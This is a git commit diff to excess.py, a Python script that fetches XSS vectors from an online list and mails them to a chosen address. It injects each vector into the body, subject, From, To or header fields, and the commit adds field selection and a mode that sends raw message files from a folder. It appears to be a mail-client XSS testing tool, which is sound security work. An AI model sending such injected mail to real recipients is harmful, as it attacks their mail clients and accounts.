da4539dc047b376523ac6d8fa143a1bbb684cb5f
allodoxaphobia <spamhole@telenet.be>
2013-09-25 09:42:48 +0200

    Add support for files from folder

--- excess.py
+++ excess.py
@@ -6,15 +6,17 @@ import optparse
 import urllib2
 from xml.dom.minidom import parse, parseString
 import HTMLParser
+import os
 
 
-MAIL_SERVER = "smtp-telenet.telenet-ops.be"
+MAIL_SERVER = None
 MAIL_PORT = 25
 MAIL_FROM = ""
 MAIL_TO = ""
 XSS_SHEET="http://ha.ckers.org/xssAttacks.xml"
 XSS_DOM = None
 ATTACK_TYPE = "XSS"
+ATTACK_SUB_TYPE = "ALL"
 USE_MIME=1
 HEADERS = ""
 SMTPOBJ  = None
@@ -115,25 +117,39 @@ def main():
 				name = node.getElementsByTagName("name")[0].childNodes[0].nodeValue
 				code = node.getElementsByTagName("code")[0].childNodes[0].nodeValue
 				print "XSS TEST: " + name
+				if ATTACK_SUB_TYPE == "ALL": 
+					msg = buildmsg(h.unescape(code),h.unescape(code),h.unescape(code),"",h.unescape(code),True,True)
 				#body
-				msg = buildmsg(MAIL_FROM, MAIL_TO,"In Body " + name,"",h.unescape(code),True,True)
-				sendrawmail(MAIL_FROM, MAIL_TO,msg)
-				#subject
-				msg = buildmsg(MAIL_FROM, MAIL_TO,h.unescape(code),"","In Subject " + name,True,True)
-				sendrawmail(MAIL_FROM, MAIL_TO,msg)
-				#from
-				msg = buildmsg(h.unescape(code),MAIL_TO,"In From " + name,"","In From " + name,True,False)
-				sendrawmail(MAIL_FROM, MAIL_TO,msg)
-				#to
-				msg = buildmsg(MAIL_FROM,h.unescape(code),"In To " + name ,"","In To " + name,True,False)
-				sendrawmail(MAIL_FROM, MAIL_TO,msg)
-				#additional header
-				msg = buildmsg(MAIL_FROM, MAIL_TO,"In Extra Header " + name ,h.unescape(code),"In Extra Header " + name,True,False)				
+				elif ATTACK_SUB_TYPE == "BODY":
+					msg = buildmsg(MAIL_FROM, MAIL_TO,"In Body " + name,"",h.unescape(code),True,True)
+				elif ATTACK_SUB_TYPE == "SUBJECT":
+					msg = buildmsg(MAIL_FROM, MAIL_TO,h.unescape(code),"","In Subject " + name,True,True)
+				elif ATTACK_SUB_TYPE == "FROM":
+					msg = buildmsg(h.unescape(code),MAIL_TO,"In From " + name,"","In From " + name,True,False)
+				elif ATTACK_SUB_TYPE == "TO":
+					msg = buildmsg(MAIL_FROM,h.unescape(code),"In To " + name ,"","In To " + name,True,False)
+				elif ATTACK_SUB_TYPE == "HEADER":
+					msg = buildmsg(MAIL_FROM, MAIL_TO,"In Extra Header " + name ,h.unescape(code),"In Extra Header " + name,True,False)				
 				sendrawmail(MAIL_FROM, MAIL_TO, msg)
 		except Exception, e2:
 			print "Error sending mail: \n" + e.message
 			exit(2)
-
+	elif ATTACK_TYPE=="DIR":
+		if os.path.exists(ATTACK_SUB_TYPE):
+			path = ATTACK_SUB_TYPE
+			if path[len(path)-1:]!="/": path=path+"/"
+			for dirpath, dirs, files in os.walk(ATTACK_SUB_TYPE):
+				for lfile in files:
+					f = open(path+lfile)
+					msg = f.read()
+					f.close()
+					msg= msg.replace("$from$",MAIL_FROM)
+					msg = msg.replace("$to$",MAIL_TO)
+					msg = msg.replace("$subject$",lfile)
+					sendrawmail(MAIL_FROM, MAIL_TO, msg)
+					print "Sent file: " + lfile
+		else:
+			print "Invalid folder specified for --param :" + ATTACK_SUB_TYPE
 def init():
 	#argument parsing
 	global MAIL_SERVER
@@ -141,15 +157,31 @@ def init():
 	global MAIL_FROM
 	global MAIL_TO
 	global ATTACK_TYPE
+	global ATTACK_SUB_TYPE
 	global USE_MIME
 	global INIT_OK
 	try:
-		parser = optparse.OptionParser(usage = '%prog -s=smtpserver -t=toemail')
+		parser = optparse.OptionParser(usage = """
+Command Line:
+-------------
+%prog -s smtp_server -f from -t to -a [XSS or DIR] --param [XSS: Fieldname, DIR: path]
+
+XSS:
+----
+-a XSS is the default, will retireve XML containing XSS exploits from http://ha.ckers.org/xssAttacks.xml
+--param decides which field will be injected can be set to ALL (default), FROM, TO, SUBJECT,BODY or HEADER.
+
+DIR:
+-----
+-a DIR will read all files in a directory and email them. The files must contain a full message including headers. Values $from$ $to$ and $subject$ will be replaced with their correspondingv alue when specified.
+--param the directory which will be read
+""")
 		parser.add_option("-s", default=None, dest="smtp_server")
 		parser.add_option("-p", default=25, dest="smtp_port")
 		parser.add_option("-f", default="excell3@nowhere.org", dest="smtp_from")
 		parser.add_option("-t", default=None, dest="smtp_to")
 		parser.add_option("-a", default="XSS", dest="attack_type")
+		parser.add_option("--param", default="ALL", dest="attack_sub_type")#XSS:all,to,from,subject,body,header FOLDER: folder
 		options, args = parser.parse_args()
 		if not options.smtp_server :
 			print "Option -s is mandatory"
@@ -163,11 +195,13 @@ def init():
 		MAIL_TO = options.smtp_to
 		USE_MIME = True
 		#todo
-		ATTACK_TYPE = options.attack_type
+		ATTACK_TYPE = options.attack_type.upper()
+		ATTACK_SUB_TYPE = options.attack_sub_type
+		if ATTACK_TYPE != "DIR": ATTACK_SUB_TYPE=ATTACK_SUB_TYPE.upper()
 		INIT_OK=True
 	except Exception, e:
-		print e.message
-		print 'test.py -i <inputfile> -o <outputfile>'
+		print e#.message
+		print 'excess.py -s smtp_server -f from -t to -a [XSS or DIR] --param [XSS: Fieldname, DIR: path]'
 		sys.exit(2)
 	except KeyboardInterrupt:
 		pass
